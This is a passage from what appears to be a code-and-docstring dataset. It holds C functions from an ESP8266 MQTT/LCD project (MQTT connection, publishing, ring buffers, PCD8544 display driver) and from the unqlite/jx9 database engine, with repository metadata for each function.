mqtt_tcpclient_recon_cb);\n\n\tmqttClient->keepAliveTick = 0;\n\tmqttClient->reconnectTick = 0;\n\n\n\tos_timer_disarm(&mqttClient->mqttTimer);\n\tos_timer_setfn(&mqttClient->mqttTimer, (os_timer_func_t *)mqtt_timer, mqttClient);\n\tos_timer_arm(&mqttClient->mqttTimer, 1000, 1);\n\n\tif (UTILS_StrToIP(mqttClient->host, &mqttClient->pCon->proto.tcp->remote_ip)) {\n\t\tINFO(\"TCP: Connect to ip  %s:%d\\r\\n\", mqttClient->host, mqttClient->port);\n\t\tif (mqttClient->security)\n\t\t{\n#ifdef MQTT_SSL_ENABLE\n\t\t\tespconn_secure_connect(mqttClient->pCon);\n#else\n\t\t\tINFO(\"TCP: Do not support SSL\\r\\n\");\n#endif\n\t\t}\n\t\telse\n\t\t{\n\t\t\tespconn_connect(mqttClient->pCon);\n\t\t}\n\t}\n\telse {\n\t\tINFO(\"TCP: Connect to domain %s:%d\\r\\n\", mqttClient->host, mqttClient->port);\n\t\tespconn_gethostbyname(mqttClient->pCon, mqttClient->host, &mqttClient->ip, mqtt_dns_found);\n\t}\n\tmqttClient->connState = TCP_CONNECTING;\n}", "path": "mqtt\\mqtt\\mqtt.c", "repo_name": "eadf/esp_mqtt_lcd", "stars": 70, "license": "gpl-3.0", "language": "c", "size": 600}
{"docstring": "/**\n* \\brief put a character into ring buffer\n* \\param r pointer to a ringbuf object\n* \\param c character to be put\n* \\return 0 if successfull, otherwise failed\n*/\n", "func_signal": "I16 ICACHE_FLASH_ATTR RINGBUF_Put(RINGBUF *r, U8 c)", "code": "{\n\tif(r->fill_cnt>=r->size)return -1;\t\t// ring buffer is full, this should be atomic operation\n\t\n\n\tr->fill_cnt++;\t\t\t\t\t\t\t// increase filled slots count, this should be atomic operation\n\n\t\n\t*r->p_w++ = c;\t\t\t\t\t\t\t// put character into buffer\n\t\n\tif(r->p_w >= r->p_o + r->size)\t\t\t// rollback if write pointer go pass\n\t\tr->p_w = r->p_o;\t\t\t\t\t// the physical boundary\n\t\n\treturn 0;\n}", "path": "mqtt\\mqtt\\ringbuf.c", "repo_name": "eadf/esp_mqtt_lcd", "stars": 70, "license": "gpl-3.0", "language": "c", "size": 600}
{"docstring": "/**\n* \\brief init a RINGBUF object\n* \\param r pointer to a RINGBUF object\n* \\param buf pointer to a byte array\n* \\param size size of buf\n* \\return 0 if successfull, otherwise failed\n*/\n", "func_signal": "I16 ICACHE_FLASH_ATTR RINGBUF_Init(RINGBUF *r, U8* buf, I32 size)", "code": "{\n\tif(r == NULL || buf == NULL || size < 2) return -1;\n\t\n\tr->p_o = r->p_r = r->p_w = buf;\n\tr->fill_cnt = 0;\n\tr->size = size;\n\t\n\treturn 0;\n}", "path": "mqtt\\mqtt\\ringbuf.c", "repo_name": "eadf/esp_mqtt_lcd", "stars": 70, "license": "gpl-3.0", "language": "c", "size": 600}
{"docstring": "/**\n  * @brief  Delete tcp client and free all memory\n  * @param  mqttClient: The mqtt client which contain TCP client\n  * @retval None\n  */\n", "func_signal": "void ICACHE_FLASH_ATTR\nmqtt_tcpclient_delete(MQTT_Client *mqttClient)", "code": "{\n\tif (mqttClient->pCon != NULL) {\n\t\tINFO(\"Free memory\\r\\n\");\t\n\t\tespconn_delete(mqttClient->pCon);\n\t\tif (mqttClient->pCon->proto.tcp)\n\t\t\tos_free(mqttClient->pCon->proto.tcp);\n\t\tos_free(mqttClient->pCon);\n\t\tmqttClient->pCon = NULL;\n\t}\n}", "path": "mqtt\\mqtt\\mqtt.c", "repo_name": "eadf/esp_mqtt_lcd", "stars": 70, "license": "gpl-3.0", "language": "c", "size": 600}
{"docstring": "/**\n * Sets the contrast [0x00 - 0x7f].\n * Useful, visible range is about 40-60.\n */\n", "func_signal": "void ICACHE_FLASH_ATTR\nPCD8544_setContrast(uint8_t contrast)", "code": "{\n  if (contrast != 0) {\n    contrast = 0x80|(contrast&0x7f);\n  }\n  PCD8544_lcdWrite8( LCD_CMD, PCD8544_FUNCTIONSET | PCD8544_EXTENDEDINSTRUCTION );\n  PCD8544_lcdWrite8( LCD_CMD, PCD8544_SETVOP | contrast);\n  PCD8544_lcdWrite8( LCD_CMD, PCD8544_FUNCTIONSET);\n}", "path": "driver\\pcd8544\\pcd8544.c", "repo_name": "eadf/esp_mqtt_lcd", "stars": 70, "license": "gpl-3.0", "language": "c", "size": 600}
{"docstring": "/**\n * Set up the GPIO pins and the rest of the environment\n */\n", "func_signal": "void ICACHE_FLASH_ATTR\nPCD8544_init(PCD8544_Settings *settings)", "code": "{\n\n  if (settings!=NULL){\n    pinReset = settings->resetPin;\n    pinSce   = settings->scePin;\n    pinDc    = settings->dcPin;\n    pinSdin  = settings->sdinPin;\n    pinSclk  = settings->sclkPin;\n  }\n  uint8_t uniquePins = 3;\n  uint32_t bits = BIT(pinDc)|BIT(pinSdin)|BIT(pinSclk);\n  if (pinReset>=0) {\n    uniquePins += 1;\n    bits |= BIT(pinReset);\n  }\n  if (pinSce>=0) {\n    uniquePins += 1;\n    bits |= BIT(pinSce);\n  }\n\n  if (easygpio_countBits(bits)!=uniquePins) {\n    os_printf(\"PCD8544_init Error: you must specify exactly %d unique pin numbers\\n\", uniquePins);\n    return;\n  }\n\n  // Define each used pin as a GPIO output\n  if(pinReset>=0) {\n    if (!easygpio_pinMode(pinReset, EASYGPIO_NOPULL, EASYGPIO_OUTPUT)) {\n      return;\n    }\n  }\n  if(pinSce>=0) {\n    if (!easygpio_pinMode(pinSce, EASYGPIO_NOPULL, EASYGPIO_OUTPUT)) {\n      return;\n    }\n  }\n  if (!(easygpio_pinMode(pinDc,   EASYGPIO_NOPULL, EASYGPIO_OUTPUT) &&\n        easygpio_pinMode(pinSdin, EASYGPIO_NOPULL, EASYGPIO_OUTPUT) &&\n        easygpio_pinMode(pinSclk, EASYGPIO_NOPULL, EASYGPIO_OUTPUT))) {\n    return;\n  }\n\n  // Set default pin output values\n  if (pinReset>=0)\n    GPIO_OUTPUT_SET(pinReset, HIGH);\n  if (pinSce>=0)\n    GPIO_OUTPUT_SET(pinSce, HIGH);\n  GPIO_OUTPUT_SET(pinDc, HIGH);\n  GPIO_OUTPUT_SET(pinSdin, LOW);\n  GPIO_OUTPUT_SET(pinSclk, LOW);\n\n  PCD8544_isInitiated = true;\n  PCD8544_initLCD(settings);\n}", "path": "driver\\pcd8544\\pcd8544.c", "repo_name": "eadf/esp_mqtt_lcd", "stars": 70, "license": "gpl-3.0", "language": "c", "size": 600}
{"docstring": "/**\n  * @brief  MQTT publish function.\n  * @param  client: \tMQTT_Client reference\n  * @param  topic: \t\tstring topic will publish to\n  * @param  data: \t\tbuffer data send point to\n  * @param  data_length: length of data\n  * @param  qos:\t\tqos\n  * @param  retain:\t\tretain\n  * @retval TRUE if success queue\n  */\n", "func_signal": "BOOL ICACHE_FLASH_ATTR\nMQTT_Publish(MQTT_Client *client, const char* topic, const char* data, int data_length, int qos, int retain)", "code": "{\n\tuint8_t dataBuffer[MQTT_BUF_SIZE];\n\tuint16_t dataLen;\n\tclient->mqtt_state.outbound_message = mqtt_msg_publish(&client->mqtt_state.mqtt_connection,\n\t                                      topic, data, data_length,\n\t                                      qos, retain,\n\t                                      &client->mqtt_state.pending_msg_id);\n\tif (client->mqtt_state.outbound_message->length == 0) {\n\t\tINFO(\"MQTT: Queuing publish failed\\r\\n\");\n\t\treturn FALSE;\n\t}\n\tINFO(\"MQTT: queuing publish, length: %d, queue size(%d/%d)\\r\\n\", client->mqtt_state.outbound_message->length, client->msgQueue.rb.fill_cnt, client->msgQueue.rb.size);\n\twhile (QUEUE_Puts(&client->msgQueue, client->mqtt_state.outbound_message->data, client->mqtt_state.outbound_message->length) == -1) {\n\t\tINFO(\"MQTT: Queue full\\r\\n\");\n\t\tif (QUEUE_Gets(&client->msgQueue, dataBuffer, &dataLen, MQTT_BUF_SIZE) == -1) {\n\t\t\tINFO(\"MQTT: Serious buffer error\\r\\n\");\n\t\t\treturn FALSE;\n\t\t}\n\t}\n\tsystem_os_post(MQTT_TASK_PRIO, 0, (os_param_t)client);\n\treturn TRUE;\n}", "path": "mqtt\\mqtt\\mqtt.c", "repo_name": "eadf/esp_mqtt_lcd", "stars": 70, "license": "gpl-3.0", "language": "c", "size": 600}
{"docstring": "/**\n * initiate the LCD itself\n */\n", "func_signal": "void ICACHE_FLASH_ATTR\nPCD8544_initLCD(PCD8544_Settings *settings)", "code": "{\n  if (!PCD8544_isInitiated) {\n    os_printf(\"PCD8544 module is not completely configured. Check your pin definitions.\\r\\n\");\n    return;\n  }\n\n  if (pinReset>=0){\n    os_delay_us(10000);\n    GPIO_OUTPUT_SET(pinReset, LOW);\n    os_delay_us(CLOCK_HIGH_TIME*3);\n    GPIO_OUTPUT_SET(pinReset, HIGH);\n    os_delay_us(10000);\n  }\n\n  PCD8544_lcdWrite8( LCD_CMD, 0x21 );  // LCD Extended Commands.\n  if (settings!=NULL) {\n    PCD8544_lcdWrite8( LCD_CMD, 0x80|(settings->lcdVop&0x7F) ); // Set LCD Vop (Contrast). //B1\n    PCD8544_lcdWrite8( LCD_CMD, settings->tempCoeff );  // Set Temp coefficent. //0x04\n    PCD8544_lcdWrite8( LCD_CMD, settings->biasMode  );  // LCD bias mode 1:48. //0x13\n    PCD8544_lcdWrite8( LCD_CMD, settings->inverse?0x0d:0x0C );  // LCD 0x0C in normal mode. 0x0d for inverse\n  } else {\n    PCD8544_lcdWrite8( LCD_CMD, 0xB1 );  // Set LCD Vop (Contrast). //B1\n    PCD8544_lcdWrite8( LCD_CMD, 0x04 );  // Set Temp coefficent. //0x04\n    PCD8544_lcdWrite8( LCD_CMD, 0x14 );  // LCD bias mode 1:48. //0x13\n    PCD8544_lcdWrite8( LCD_CMD, 0x0C );  // LCD in normal mode. 0x0d for inverse\n  }\n\n  PCD8544_lcdWrite8( LCD_CMD, 0x20);\n  PCD8544_lcdWrite8( LCD_CMD, 0x0C);\n  os_delay_us(100000);\n  PCD8544_lcdClear();\n  os_delay_us(10000);\n  os_printf(\"--------------------------------------\\n\");\n  os_printf(\"-Initiated LCD display with these pins:\\n\");\n  os_printf(\"--------------------------------------\\n\");\n  if (pinReset>=0)\n    os_printf(\" LCD RST Pin 1 <=> GPIO%d\\n\", pinReset);\n  else\n    os_printf(\" LCD RST Pin 1 <=> NC (esp reset)\\n\");\n  if (pinSce>=0)\n    os_printf(\" LCD CE  Pin 2 <=> GPIO%d\\n\", pinSce);\n  else\n    os_printf(\" LCD CE  Pin 2 <=> NC (pull low)\\n\");\n  os_printf(\" LCD DC  Pin 3 <=> GPIO%d\\n\", pinDc);\n  os_printf(\" LCD Din Pin 4 <=> GPIO%d\\n\", pinSdin);\n  os_printf(\" LCD Clk Pin 5 <=> GPIO%d\\n\", pinSclk);\n  os_printf(\" Some ESP-12 boards have GPIO4 & GPIO5 reversed\\n\\n\", pinSclk);\n\n}", "path": "driver\\pcd8544\\pcd8544.c", "repo_name": "eadf/esp_mqtt_lcd", "stars": 70, "license": "gpl-3.0", "language": "c", "size": 600}
{"docstring": "/**\n * Show open hardware logo at startup\n */\n", "func_signal": "static void ICACHE_FLASH_ATTR\nlcdInitTask(os_event_t *events)", "code": "{\n  static uint32_t loopIterations = 0;\n  loopIterations+=1;\n  if (loopIterations < 2) {\n    // I wonder why the calls to initLCD in user_init doesn't 'take'\n    PCD8544_initLCD(&pcd8544_settings);\n    os_delay_us(50000);\n    PCD8544_lcdImage(openhardware_logo);\n    os_printf(\"Initiating display: %d\\n\", loopIterations);\n    os_timer_disarm(&lcd_timer);\n    os_timer_arm(&lcd_timer, user_procTaskPeriod, 0);\n  } else if (loopIterations == 2){\n    PCD8544_lcdClear();\n    PCD8544_gotoXY(0,0);\n    PCD8544_lcdPrint(\"mqtt topic:\");\n    PCD8544_gotoXY(0,1);\n    PCD8544_lcdPrint(clientid);\n  }\n}", "path": "user\\user_main.c", "repo_name": "eadf/esp_mqtt_lcd", "stars": 70, "license": "gpl-3.0", "language": "c", "size": 600}
{"docstring": "/**\n  * @brief  MQTT ping function.\n  * @param  client: \tMQTT_Client reference\n  * @retval TRUE if success queue\n  */\n", "func_signal": "BOOL ICACHE_FLASH_ATTR\nMQTT_Ping(MQTT_Client *client)", "code": "{\n\tuint8_t dataBuffer[MQTT_BUF_SIZE];\n\tuint16_t dataLen;\n\tclient->mqtt_state.outbound_message = mqtt_msg_pingreq(&client->mqtt_state.mqtt_connection);\n\tif(client->mqtt_state.outbound_message->length == 0){\n\t\tINFO(\"MQTT: Queuing publish failed\\r\\n\");\n\t\treturn FALSE;\n\t}\n\tINFO(\"MQTT: queuing publish, length: %d, queue size(%d/%d)\\r\\n\", client->mqtt_state.outbound_message->length, client->msgQueue.rb.fill_cnt, client->msgQueue.rb.size);\n\twhile(QUEUE_Puts(&client->msgQueue, client->mqtt_state.outbound_message->data, client->mqtt_state.outbound_message->length) == -1){\n\t\tINFO(\"MQTT: Queue full\\r\\n\");\n\t\tif(QUEUE_Gets(&client->msgQueue, dataBuffer, &dataLen, MQTT_BUF_SIZE) == -1) {\n\t\t\tINFO(\"MQTT: Serious buffer error\\r\\n\");\n\t\t\treturn FALSE;\n\t\t}\n\t}\n\tsystem_os_post(MQTT_TASK_PRIO, 0, (os_param_t)client);\n\treturn TRUE;\n}", "path": "mqtt\\mqtt\\mqtt.c", "repo_name": "eadf/esp_mqtt_lcd", "stars": 70, "license": "gpl-3.0", "language": "c", "size": 600}
{"docstring": "/**\n  * @brief  Delete MQTT client and free all memory\n  * @param  mqttClient: The mqtt client\n  * @retval None\n  */\n", "func_signal": "void ICACHE_FLASH_ATTR\nmqtt_client_delete(MQTT_Client *mqttClient)", "code": "{\n\tmqtt_tcpclient_delete(mqttClient);\n\tif (mqttClient->host != NULL) {\n\t\tos_free(mqttClient->host);\n\t\tmqttClient->host = NULL;\n\t}\n\n\tif (mqttClient->user_data != NULL) {\n\t\tos_free(mqttClient->user_data);\n\t\tmqttClient->user_data = NULL;\n\t}\n\n\tif(mqttClient->connect_info.client_id != NULL) {\n\t\tos_free(mqttClient->connect_info.client_id);\n\t\tmqttClient->connect_info.client_id = NULL;\n\t}\n\n\tif(mqttClient->connect_info.username != NULL) {\n\t\tos_free(mqttClient->connect_info.username);\n\t\tmqttClient->connect_info.username = NULL;\n\t}\n\n\tif(mqttClient->connect_info.password != NULL) {\n\t\tos_free(mqttClient->connect_info.password);\n\t\tmqttClient->connect_info.password = NULL;\n\t}\n\n\tif(mqttClient->connect_info.will_topic != NULL) {\n\t\tos_free(mqttClient->connect_info.will_topic);\n\t\tmqttClient->connect_info.will_topic = NULL;\n\t}\n\n\tif(mqttClient->connect_info.will_message != NULL) {\n\t\tos_free(mqttClient->connect_info.will_message);\n\t\tmqttClient->connect_info.will_message = NULL;\n\t}\n\n\tif(mqttClient->mqtt_state.in_buffer != NULL) {\n\t\tos_free(mqttClient->mqtt_state.in_buffer);\n\t\tmqttClient->mqtt_state.in_buffer = NULL;\n\t}\n\n\tif(mqttClient->mqtt_state.out_buffer != NULL) {\n\t\tos_free(mqttClient->mqtt_state.out_buffer);\n\t\tmqttClient->mqtt_state.out_buffer = NULL;\n\t}\n}", "path": "mqtt\\mqtt\\mqtt.c", "repo_name": "eadf/esp_mqtt_lcd", "stars": 70, "license": "gpl-3.0", "language": "c", "size": 600}
{"docstring": "/**\n  * @brief  Client send over callback function.\n  * @param  arg: contain the ip link information\n  * @retval None\n  */\n", "func_signal": "void ICACHE_FLASH_ATTR\nmqtt_tcpclient_sent_cb(void *arg)", "code": "{\n\tstruct espconn *pCon = (struct espconn *)arg;\n\tMQTT_Client* client = (MQTT_Client *)pCon->reverse;\n\tINFO(\"TCP: Sent\\r\\n\");\n\tclient->sendTimeout = 0;\n\tif ((client->connState == MQTT_DATA || client->connState == MQTT_KEEPALIVE_SEND)\n\t\t\t\t&& client->mqtt_state.pending_msg_type == MQTT_MSG_TYPE_PUBLISH) {\n\t\tif (client->publishedCb)\n\t\t\tclient->publishedCb((uint32_t*)client);\n\t}\n\tsystem_os_post(MQTT_TASK_PRIO, 0, (os_param_t)client);\n}", "path": "mqtt\\mqtt\\mqtt.c", "repo_name": "eadf/esp_mqtt_lcd", "stars": 70, "license": "gpl-3.0", "language": "c", "size": 600}
{"docstring": "/**\n  * @brief  MQTT initialization connection function\n  * @param  client: \tMQTT_Client reference\n  * @param  host: \tDomain or IP string\n  * @param  port: \tPort to connect\n  * @param  security:\t\t1 for ssl, 0 for none\n  * @retval None\n  */\n", "func_signal": "void ICACHE_FLASH_ATTR\nMQTT_InitConnection(MQTT_Client *mqttClient, uint8_t* host, uint32_t port, uint8_t security)", "code": "{\n\tuint32_t temp;\n\tINFO(\"MQTT_InitConnection\\r\\n\");\n\tos_memset(mqttClient, 0, sizeof(MQTT_Client));\n\ttemp = os_strlen(host);\n\tmqttClient->host = (uint8_t*)os_zalloc(temp + 1);\n\tos_strcpy(mqttClient->host, host);\n\tmqttClient->host[temp] = 0;\n\tmqttClient->port = port;\n\tmqttClient->security = security;\n\n}", "path": "mqtt\\mqtt\\mqtt.c", "repo_name": "eadf/esp_mqtt_lcd", "stars": 70, "license": "gpl-3.0", "language": "c", "size": 600}
{"docstring": "/**\n * print ' ' a number of times\n */\n", "func_signal": "void ICACHE_FLASH_ATTR\nPCD8544_lcdPad(int16_t spaces)", "code": "{\n  uint8_t i=0;\n  //os_printf(\"PCD8544_lcdPad: padding %d spaces\\n\", spaces);\n  for (i=0; i<spaces; i++) {\n    PCD8544_lcdCharacter(' ');\n  }\n}", "path": "driver\\pcd8544\\pcd8544.c", "repo_name": "eadf/esp_mqtt_lcd", "stars": 70, "license": "gpl-3.0", "language": "c", "size": 600}
{"docstring": "/**\n  * @brief  MQTT initialization mqtt client function\n  * @param  client: \tMQTT_Client reference\n  * @param  clientid: \tMQTT client id\n  * @param  client_user:MQTT client user\n  * @param  client_pass:MQTT client password\n  * @param  client_pass:MQTT keep alive timer, in second\n  * @retval None\n  */\n", "func_signal": "void ICACHE_FLASH_ATTR\nMQTT_InitClient(MQTT_Client *mqttClient, uint8_t* client_id, uint8_t* client_user, uint8_t* client_pass, uint32_t keepAliveTime, uint8_t cleanSession)", "code": "{\n\tuint32_t temp;\n\tINFO(\"MQTT_InitClient\\r\\n\");\n\n\tos_memset(&mqttClient->connect_info, 0, sizeof(mqtt_connect_info_t));\n\n\ttemp = os_strlen(client_id);\n\tmqttClient->connect_info.client_id = (uint8_t*)os_zalloc(temp + 1);\n\tos_strcpy(mqttClient->connect_info.client_id, client_id);\n\tmqttClient->connect_info.client_id[temp] = 0;\n\n\ttemp = os_strlen(client_user);\n\tmqttClient->connect_info.username = (uint8_t*)os_zalloc(temp + 1);\n\tos_strcpy(mqttClient->connect_info.username, client_user);\n\tmqttClient->connect_info.username[temp] = 0;\n\n\ttemp = os_strlen(client_pass);\n\tmqttClient->connect_info.password = (uint8_t*)os_zalloc(temp + 1);\n\tos_strcpy(mqttClient->connect_info.password, client_pass);\n\tmqttClient->connect_info.password[temp] = 0;\n\n\n\tmqttClient->connect_info.keepalive = keepAliveTime;\n\tmqttClient->connect_info.clean_session = cleanSession;\n\n\tmqttClient->mqtt_state.in_buffer = (uint8_t *)os_zalloc(MQTT_BUF_SIZE);\n\tmqttClient->mqtt_state.in_buffer_length = MQTT_BUF_SIZE;\n\tmqttClient->mqtt_state.out_buffer =  (uint8_t *)os_zalloc(MQTT_BUF_SIZE);\n\tmqttClient->mqtt_state.out_buffer_length = MQTT_BUF_SIZE;\n\tmqttClient->mqtt_state.connect_info = &mqttClient->connect_info;\n\n\tmqtt_msg_init(&mqttClient->mqtt_state.mqtt_connection, mqttClient->mqtt_state.out_buffer, mqttClient->mqtt_state.out_buffer_length);\n\n\tQUEUE_Init(&mqttClient->msgQueue, QUEUE_BUFFER_SIZE);\n\n\tsystem_os_task(MQTT_Task, MQTT_TASK_PRIO, mqtt_procTaskQueue, MQTT_TASK_QUEUE_SIZE);\n\tsystem_os_post(MQTT_TASK_PRIO, 0, (os_param_t)mqttClient);\n}", "path": "mqtt\\mqtt\\mqtt.c", "repo_name": "eadf/esp_mqtt_lcd", "stars": 70, "license": "gpl-3.0", "language": "c", "size": 600}
{"docstring": "/**\n  * @brief  Tcp client connect success callback function.\n  * @param  arg: contain the ip link information\n  * @retval None\n  */\n", "func_signal": "void ICACHE_FLASH_ATTR\nmqtt_tcpclient_connect_cb(void *arg)", "code": "{\n\tstruct espconn *pCon = (struct espconn *)arg;\n\tMQTT_Client* client = (MQTT_Client *)pCon->reverse;\n\n\tespconn_regist_disconcb(client->pCon, mqtt_tcpclient_discon_cb);\n\tespconn_regist_recvcb(client->pCon, mqtt_tcpclient_recv);////////\n\tespconn_regist_sentcb(client->pCon, mqtt_tcpclient_sent_cb);///////\n\tINFO(\"MQTT: Connected to broker %s:%d\\r\\n\", client->host, client->port);\n\n\tmqtt_msg_init(&client->mqtt_state.mqtt_connection, client->mqtt_state.out_buffer, client->mqtt_state.out_buffer_length);\n\tclient->mqtt_state.outbound_message = mqtt_msg_connect(&client->mqtt_state.mqtt_connection, client->mqtt_state.connect_info);\n\tclient->mqtt_state.pending_msg_type = mqtt_get_type(client->mqtt_state.outbound_message->data);\n\tclient->mqtt_state.pending_msg_id = mqtt_get_id(client->mqtt_state.outbound_message->data, client->mqtt_state.outbound_message->length);\n\n\n\tclient->sendTimeout = MQTT_SEND_TIMOUT;\n\tINFO(\"MQTT: Sending, type: %d, id: %04X\\r\\n\", client->mqtt_state.pending_msg_type, client->mqtt_state.pending_msg_id);\n\tif (client->security) {\n#ifdef MQTT_SSL_ENABLE\n\t\tespconn_secure_send(client->pCon, client->mqtt_state.outbound_message->data, client->mqtt_state.outbound_message->length);\n#else\n\t\tINFO(\"TCP: Do not support SSL\\r\\n\");\n#endif\n\t}\n\telse {\n\t\tespconn_send(client->pCon, client->mqtt_state.outbound_message->data, client->mqtt_state.outbound_message->length);\n\t}\n\n\tclient->mqtt_state.outbound_message = NULL;\n\tclient->connState = MQTT_CONNECT_SENDING;\n\tsystem_os_post(MQTT_TASK_PRIO, 0, (os_param_t)client);\n}", "path": "mqtt\\mqtt\\mqtt.c", "repo_name": "eadf/esp_mqtt_lcd", "stars": 70, "license": "gpl-3.0", "language": "c", "size": 600}
{"docstring": "/**\n * draws a box\n */\n", "func_signal": "void ICACHE_FLASH_ATTR\nPCD8544_drawLine(void)", "code": "{\n  uint8_t  j;\n  for(j=0; j<84; j++) { // top\n    PCD8544_gotoXY(j,0);\n    PCD8544_lcdWrite8(LCD_DATA,0x01);\n  }\n  for(j=0; j<84; j++) { //Bottom\n\n    PCD8544_gotoXY(j,5);\n    PCD8544_lcdWrite8(LCD_DATA,0x80);\n  }\n  for(j=0; j<6; j++) {// Right\n\n    PCD8544_gotoXY(83,j);\n    PCD8544_lcdWrite8(LCD_DATA,0xff);\n  }\n  for(j=0; j<6; j++) {// Left\n\n    PCD8544_gotoXY(0,j);\n    PCD8544_lcdWrite8(LCD_DATA,0xff);\n  }\n}", "path": "driver\\pcd8544\\pcd8544.c", "repo_name": "eadf/esp_mqtt_lcd", "stars": 70, "license": "gpl-3.0", "language": "c", "size": 600}
{"docstring": "/*\n** Acquire a reader lock.\n*/\n", "func_signal": "static int getReadLock(winFile *pFile)", "code": "{\n  int res;\n  OVERLAPPED ovlp;\n  ovlp.Offset = SHARED_FIRST;\n  ovlp.OffsetHigh = 0;\n  ovlp.hEvent = 0;\n  res = LockFileEx(pFile->h, LOCKFILE_FAIL_IMMEDIATELY,0, SHARED_SIZE, 0, &ovlp);\n  if( res == 0 ){\n    pFile->lastErrno = GetLastError();\n  }\n  return res;\n}", "path": "src\\unqlitego\\unqlite.c", "repo_name": "xjdrew/redis-persist", "stars": 72, "license": "None", "language": "c", "size": 895}
{"docstring": "/*\n * Write local payload.\n */\n", "func_signal": "static int lhCellWriteLocalPayload(lhcell *pCell,\n\tconst void *pKey,sxu32 nKeylen,\n\tconst void *pData,unqlite_int64 nDatalen\n\t)", "code": "{\n\t/* A writer lock have been acquired on this page */\n\tlhpage *pPage = pCell->pPage;\n\tunsigned char *zRaw = pPage->pRaw->zData;\n\t/* Seek to the desired location */\n\tzRaw += pCell->iStart + L_HASH_CELL_SZ;\n\t/* Write the key */\n\tSyMemcpy(pKey,(void *)zRaw,nKeylen);\n\tzRaw += nKeylen;\n\tif( nDatalen > 0 ){\n\t\t/* Write the Data */\n\t\tSyMemcpy(pData,(void *)zRaw,(sxu32)nDatalen);\n\t}\n\treturn UNQLITE_OK;\n}", "path": "src\\unqlitego\\unqlite.c", "repo_name": "xjdrew/redis-persist", "stars": 72, "license": "None", "language": "c", "size": 895}
{"docstring": "/* number array_sum(array $array ) \n * (See block-coment above)\n */\n", "func_signal": "static int jx9_hashmap_sum(jx9_context *pCtx, int nArg, jx9_value **apArg)", "code": "{\n\tjx9_hashmap *pMap;\n\tjx9_value *pObj;\n\tif( nArg < 1 ){\n\t\t/* Missing arguments, return 0 */\n\t\tjx9_result_int(pCtx, 0);\n\t\treturn JX9_OK;\n\t}\n\t/* Make sure we are dealing with a valid hashmap */\n\tif( !jx9_value_is_json_array(apArg[0]) ){\n\t\t/* Invalid argument, return 0 */\n\t\tjx9_result_int(pCtx, 0);\n\t\treturn JX9_OK;\n\t}\n\tpMap = (jx9_hashmap *)apArg[0]->x.pOther;\n\tif( pMap->nEntry < 1 ){\n\t\t/* Nothing to compute, return 0 */\n\t\tjx9_result_int(pCtx, 0);\n\t\treturn JX9_OK;\n\t}\n\t/* If the first element is of type float, then perform floating\n\t * point computaion.Otherwise switch to int64 computaion.\n\t */\n\tpObj = HashmapExtractNodeValue(pMap->pFirst);\n\tif( pObj == 0 ){\n\t\tjx9_result_int(pCtx, 0);\n\t\treturn JX9_OK;\n\t}\n\tif( pObj->iFlags & MEMOBJ_REAL ){\n\t\tDoubleSum(pCtx, pMap);\n\t}else{\n\t\tInt64Sum(pCtx, pMap);\n\t}\n\treturn JX9_OK;\n}", "path": "src\\unqlitego\\unqlite.c", "repo_name": "xjdrew/redis-persist", "stars": 72, "license": "None", "language": "c", "size": 895}
{"docstring": "/*\n** Sync the journal. In other words, make sure all the pages that have\n** been written to the journal have actually reached the surface of the\n** disk and can be restored in the event of a hot-journal rollback.\n*\n* This routine try also to obtain an exlusive lock on the database.\n*/\n", "func_signal": "static int unqliteFinalizeJournal(Pager *pPager,int *pRetry,int close_jrnl)", "code": "{\n\tint rc;\n\t*pRetry = 0;\n\t/* Grab the exclusive lock first */\n\trc = pager_lock_db(pPager,EXCLUSIVE_LOCK);\n\tif( rc != UNQLITE_OK ){\n\t\t/* Retry the excusive lock process */\n\t\t*pRetry = 1;\n\t\trc = UNQLITE_OK;\n\t}\n\tif( pPager->no_jrnl ){\n\t\t/* Journaling is omitted, return immediately */\n\t\treturn UNQLITE_OK;\n\t}\n\t/* Write the total number of database records */\n\trc = WriteInt32(pPager->pjfd,pPager->nRec,8 /* sizeof(aJournalRec) */);\n\tif( rc != UNQLITE_OK ){\n\t\tif( pPager->nRec > 0 ){\n\t\t\treturn rc;\n\t\t}else{\n\t\t\t/* Not so fatal */\n\t\t\trc = UNQLITE_OK;\n\t\t}\n\t}\n\t/* Sync the journal and close it */\n\trc = unqliteOsSync(pPager->pjfd,UNQLITE_SYNC_NORMAL);\n\tif( close_jrnl ){\n\t\t/* close the journal file */\n\t\tif( UNQLITE_OK != unqliteOsCloseFree(pPager->pAllocator,pPager->pjfd) ){\n\t\t\tif( rc != UNQLITE_OK /* unqliteOsSync */ ){\n\t\t\t\treturn rc;\n\t\t\t}\n\t\t}\n\t\tpPager->pjfd = 0;\n\t}\n\tif( (*pRetry) == 1 ){\n\t\tif( pager_lock_db(pPager,EXCLUSIVE_LOCK) == UNQLITE_OK ){\n\t\t\t/* Got exclusive lock */\n\t\t\t*pRetry = 0;\n\t\t}\n\t}\n\treturn UNQLITE_OK;\n}", "path": "src\\unqlitego\\unqlite.c", "repo_name": "xjdrew/redis-persist", "stars": 72, "license": "None", "language": "c", "size": 895}
{"docstring": "/*\n * array array_map(callback $callback, array $arr1)\n *  Applies the callback to the elements of the given arrays.\n * Parameters\n *  $callback\n *   Callback function to run for each element in each array.\n * $arr1\n *   An array to run through the callback function.\n * Return\n *  Returns an array containing all the elements of arr1 after applying\n *  the callback function to each one. \n * NOTE:\n *  array_map() passes only a single value to the callback. \n */\n", "func_signal": "static int jx9_hashmap_map(jx9_context *pCtx, int nArg, jx9_value **apArg)", "code": "{\n\tjx9_value *pArray, *pValue, sKey, sResult;\n\tjx9_hashmap_node *pEntry;\n\tjx9_hashmap *pMap;\n\tsxu32 n;\n\tif( nArg < 2 || !jx9_value_is_json_array(apArg[1]) ){\n\t\t/* Invalid arguments, return NULL */\n\t\tjx9_result_null(pCtx);\n\t\treturn JX9_OK;\n\t}\n\t/* Create a new array */\n\tpArray = jx9_context_new_array(pCtx);\n\tif( pArray == 0 ){\n\t\tjx9_result_null(pCtx);\n\t\treturn JX9_OK;\n\t}\n\t/* Point to the internal representation of the input hashmap */\n\tpMap = (jx9_hashmap *)apArg[1]->x.pOther;\n\tjx9MemObjInit(pMap->pVm, &sResult);\n\tjx9MemObjInit(pMap->pVm, &sKey);\n\t/* Perform the requested operation */\n\tpEntry = pMap->pFirst;\n\tfor( n = 0 ; n < pMap->nEntry ; n++ ){\n\t\t/* Extrcat the node value */\n\t\tpValue = HashmapExtractNodeValue(pEntry);\n\t\tif( pValue ){\n\t\t\tsxi32 rc;\n\t\t\t/* Invoke the supplied callback */\n\t\t\trc = jx9VmCallUserFunction(pMap->pVm, apArg[0], 1, &pValue, &sResult);\n\t\t\t/* Extract the node key 